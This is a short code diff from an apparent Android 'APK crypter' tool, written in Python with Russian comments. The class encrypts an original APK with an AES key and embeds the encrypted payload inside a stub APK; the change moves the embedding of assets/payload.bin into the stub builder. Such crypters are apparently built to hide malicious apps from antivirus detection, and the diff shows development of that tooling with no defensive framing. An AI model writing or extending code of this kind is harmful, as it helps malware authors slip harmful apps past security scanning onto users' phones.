@@ -35,15 +35,16 @@ class APKCrypter:
         # Шифруем оригинальный APK
         encrypted_data = self.encrypt_apk(apk_path)
         
-        # Собираем stub APK через Android SDK с информацией из оригинального APK
-        stub_apk = self.stub_builder.build_stub_apk(self.aes_key.hex(), apk_path)
+        # Собираем stub APK через Android SDK с payload внутри
+        stub_apk = self.stub_builder.build_stub_apk(
+            self.aes_key.hex(), 
+            apk_path,
+            encrypted_data
+        )
         
-        # Добавляем зашифрованный payload в stub
+        # Копируем готовый stub в output
         output_apk = self.output_dir / f"{original_name}_crypted.apk"
         shutil.copy(stub_apk, output_apk)
-        
-        with zipfile.ZipFile(output_apk, 'a', zipfile.ZIP_DEFLATED) as zipf:
-            zipf.writestr("assets/payload.bin", encrypted_data)
         
         return str(output_apk)
     
